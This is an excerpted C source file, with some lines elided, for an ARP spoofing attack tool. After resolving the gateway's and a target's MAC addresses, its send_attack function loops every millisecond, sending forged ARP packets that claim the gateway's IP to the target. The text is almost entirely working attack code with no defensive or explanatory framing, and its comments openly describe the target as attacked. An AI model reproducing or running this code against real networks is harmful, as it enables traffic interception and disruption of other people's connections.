...
int recv_pack(int sfd, struct in_addr *dst, send_arping_t *rbuf)
{
	int ret;
	char ipbuf[16];
	struct timeval tv;
...
int send_attack(int sfd, int ifindex, struct in_addr *traget, struct in_addr *gatWay, send_arping_t *tragetbuf)
{
	send_arping_t sbuf;
	int ret, i = 0;
	struct sockaddr_ll to;
	...
	memcpy(sbuf.ehdr.h_dest, tragetbuf->src_hw, ETH_ALEN);
	//gRandMac(sbuf.ehdr.h_source, ETH_ALEN);
	memcpy(sbuf.ehdr.h_source, tragetbuf->src_hw, ETH_ALEN);
	sbuf.ehdr.h_proto = htons(ETH_P_ARP);
	sbuf.ahdr.ar_hrd = htons(ARPHRD_ETHER);
	sbuf.ahdr.ar_pro = htons(ETH_P_IP);
	sbuf.ahdr.ar_hln = ETH_ALEN;
	...
	sbuf.src_ip = *gatWay;
	memcpy(sbuf.dst_hw, tragetbuf->src_hw, ETH_ALEN);
	sbuf.dst_ip = *traget;
	package(sbuf.trailer, htons(0), sizeof(sbuf.trailer));
...
int main(int c, char **v)
{
	...
	struct sockaddr_ll from;
	send_arping_t rbuf, gatWaybuf, tragetbuf;
	setuid(0);
	...
	printf("get gatWay's MAC and IP OK!\n");
	...
	while (1){
		send_pack(sfd, src_mac, ifindex, &src, &traget);
		if (recv_pack(sfd, &traget, &tragetbuf))
			continue;
		else 
			break;
	}
    
    printf("get traget's MAC and IP OK!\n");
	while (1){
		send_attack(sfd, ifindex, &traget, &gatWay, &tragetbuf);
		usleep(1000);
//        printf("the traget is attacked!\n");
	}
	return 0;
}
